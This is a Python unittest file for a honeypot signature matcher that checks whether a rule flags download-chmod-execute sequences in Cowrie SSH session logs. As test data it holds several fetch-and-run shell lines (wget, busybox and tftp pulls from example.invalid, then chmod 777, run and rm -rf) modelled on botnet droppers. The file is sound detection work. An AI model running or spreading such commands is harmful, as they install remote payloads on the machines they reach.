import itertools
from contextlib import closing
import json
from pathlib import Path
import sqlite3
import subprocess
import sys
import tempfile
import unittest

import ingest
from match_signatures import iter_sessions, load_rules, match

ROOT = Path(__file__).resolve().parents[1]
COMMANDS = ['wget http://example.invalid/p -O p', 'chmod +x p', './p']


def commands(values):
    return [(f'2026-10-28T00:00:{i:02d}Z', value) for i, value in enumerate(values)]


class SignatureTests(unittest.TestCase):
    def setUp(self):
        self.rules = load_rules(ROOT / 'signatures/rules.yaml')

    def test_order_permutations(self):
        for order in itertools.permutations(COMMANDS):
            with self.subTest(order=order):
                self.assertEqual('S01' in match(self.rules, commands(order)), list(order) == COMMANDS)
    def test_real_world_wget_variants(self):
        cases = [
            '(tftp -g example.invalid -r tftp -l- || busybox tftp -g example.invalid -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t',
            '(wget http://example.invalid/p -O p); chmod 777 p; ./p',
            '(busybox wget http://example.invalid/p -O p); chmod 777 p; ./p',
            '(wget http://example.invalid/p -O- || busybox wget http://example.invalid/p -O-) > w; chmod 777 w; ./w; rm -rf w',
        ]

        for command in cases:
            with self.subTest(command=command):
                result = match(self.rules, commands([command]))
                self.assertIn('S01', result)
    def test_s01_incomplete_sequences(self):
        cases = [
            'wget http://example.invalid/p -O p; chmod +x p',
            'wget http://example.invalid/p -O p; ./p',
            'chmod +x p; ./p',
            './p; chmod +x p; wget http://example.invalid/p -O p',
        ]

        for command in cases:
            with self.subTest(command=command):
                result = match(self.rules, commands([command]))
                self.assertNotIn('S01', result)
    def test_compound_order_permutations(self):
        for separator in ['; ', ' && ', ' | ']:
            for order in itertools.permutations(COMMANDS):
                with self.subTest(separator=separator, order=order):
                    self.assertEqual('S01' in match(self.rules, commands([separator.join(order)])),
                                     list(order) == COMMANDS)

    def test_gaps_restarts_and_counts(self):
        values = [COMMANDS[0], 'uname -a', COMMANDS[0], *COMMANDS[1:], *COMMANDS]
        self.assertEqual(match(self.rules, commands(values))['S01'], ('2026-10-28T00:00:00Z', 2))

    def test_partial_and_repeated_step(self):
        self.assertNotIn('S01', match(self.rules, commands(COMMANDS[:2])))
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / 'rules.yaml'
            path.write_text('- id: R\n  type: behavior\n  sequence: ["x", "x"]\n')
            rules = load_rules(path)
            self.assertNotIn('R', match(rules, commands(['x'])))
            self.assertIn('R', match(rules, commands(['xx'])))

    def test_equal_timestamps_do_not_prove_order(self):
        rows = [('2026-10-28T00:00:00Z', cmd) for cmd in COMMANDS]
        self.assertNotIn('S01', match(self.rules, rows))
        # Equivalent ISO spellings must also compare equal.
        rows[1] = ('2026-10-28T00:00:00+00:00', COMMANDS[1])
        rows[2] = ('2026-10-28T09:00:00+09:00', COMMANDS[2])
        self.assertNotIn('S01', match(self.rules, rows))

    def test_timestamps_sorted_and_invalid_skipped(self):
        self.assertIn('S01', match(self.rules, list(reversed(commands(COMMANDS)))))
        self.assertNotIn('S01', match(self.rules, [('bad', cmd) for cmd in COMMANDS]))

    def test_equal_time_alternative_compound_path(self):
        rows = commands(COMMANDS[:2])
        rows.append((rows[1][0], '; '.join(COMMANDS[1:])))
        self.assertIn('S01', match(self.rules, rows))

    def test_legacy_rules_unchanged(self):
        legacy = [rule for rule in self.rules
                  if rule['id'] in {f'B{i:02d}' for i in range(1, 14)}
                  | {f'C{i:02d}' for i in range(1, 6)}]
        self.assertEqual(len(legacy), 18)
        rows = commands(COMMANDS + ['uname -a', 'dota', 'chmod +x p'])
        expected = {'B08': (rows[0][0], 1), 'B11': (rows[1][0], 2),
                    'B10': (rows[2][0], 1), 'B01': (rows[3][0], 1),
                    'C01': (rows[4][0], 1)}
        self.assertEqual(match(legacy, rows), expected)

    def test_invalid_rules(self):
        for fields in ['sequence: []', 'sequence: [x]', 'sequence: [x, 3]',
                       'sequence: [x, ""]', 'sequence: [x, "a*"]',
                       'sequence: [x, y]\n  patterns: [z]']:
            with self.subTest(fields=fields), tempfile.TemporaryDirectory() as directory:
                path = Path(directory) / 'rules.yaml'
                path.write_text('- id: R\n  type: behavior\n  ' + fields + '\n')
                with self.assertRaises(SystemExit):
                    load_rules(path)

    def test_ingest_and_cli_session_isolation(self):
        with tempfile.TemporaryDirectory() as directory:
            directory = Path(directory)
            db = directory / 'test.db'
            con = sqlite3.connect(db)
            con.executescript(ingest.SCHEMA)
            # Same source / different session, and same session / different source.
            cases = [('a', 'one', [COMMANDS[0]]), ('a', 'two', COMMANDS[1:]),
                     ('b', 'one', COMMANDS[1:]), ('a', 'good', COMMANDS)]
            for source, sid, values in cases:
                path = directory / f'{source}-{sid}.json'
                events = [dict(session=sid, timestamp=ts, eventid='cowrie.command.input',
                               input=cmd, protocol='ssh') for ts, cmd in commands(values)]
                # Out-of-order arrival must not change chronological matching.
                path.write_text('\n'.join(json.dumps(e) for e in reversed(events)))
                sessions, cmds, failed, downloads, _ = ingest.collect(path)
                ingest.save(con, source, sessions, cmds, failed, downloads)
            con.commit()
            results = {key: match(self.rules, rows) for key, rows in iter_sessions(con)}
            self.assertEqual([key for key, hits in results.items() if 'S01' in hits], [('a', 'good')])
            con.close()
            args = [sys.executable, str(ROOT / 'match_signatures.py'), '--db', str(db),
                    '--rules', str(ROOT / 'signatures/rules.yaml'), '--examples', 'S01']
            for _ in range(2):
                result = subprocess.run(args, capture_output=True, text=True, encoding='utf-8',
                                        env={**__import__('os').environ, 'PYTHONIOENCODING': 'utf-8'})
                self.assertEqual(result.returncode, 0, result.stderr)
                self.assertIn('S01', result.stdout)
            with closing(sqlite3.connect(db)) as con:
                self.assertEqual(con.execute("SELECT source, session_id, n_hits FROM signature_hits "
                                             "WHERE rule_id = 'S01'").fetchall(), [('a', 'good', 1)])


if __name__ == '__main__':
    unittest.main()
